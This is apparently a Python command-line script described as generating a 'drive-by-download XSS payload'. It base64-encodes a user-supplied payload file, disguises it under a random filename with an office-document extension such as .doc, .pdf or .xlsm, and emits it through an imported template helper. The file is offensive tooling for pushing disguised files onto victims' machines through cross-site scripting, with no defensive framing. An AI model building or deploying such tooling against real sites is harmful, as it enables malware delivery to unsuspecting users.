import click
import sys
import string
import random

from core.encoder import b64
from core.convert import sub

CHOICES = (
    '.doc',  # => Microsoft Word for Windows/Word97
    '.pdf',  # => Acrobat-Portable document format
    '.xls',  # => Excel spreadsheet
    '.docx',  # => Microsoft Word for Windows/Word97
    '.xlsx',  # => Excel spreadsheet
    '.xlsm',  # => Excel spreadsheet with macros
)


@click.command()
@click.option('--suffix', type=click.Choice(CHOICES, case_sensitive=True))
@click.option('--payload', type=click.Path(exists=True, dir_okay=False))
def generate(suffix, payload):
    """Generate a drive-by-download XSS payload."""
    cli_args = sys.argv[1:]

    if len(cli_args) == 0:
        context = click.get_current_context()
        click.echo(context.get_help())
        context.exit(2)

    char_set = string.printable[:36]
    filename = ''.join(random.choice(char_set) for _ in range(7))
    embedded = b64(payload)

    click.echo(sub((filename + suffix, embedded)))


if __name__ == '__main__':
    generate()
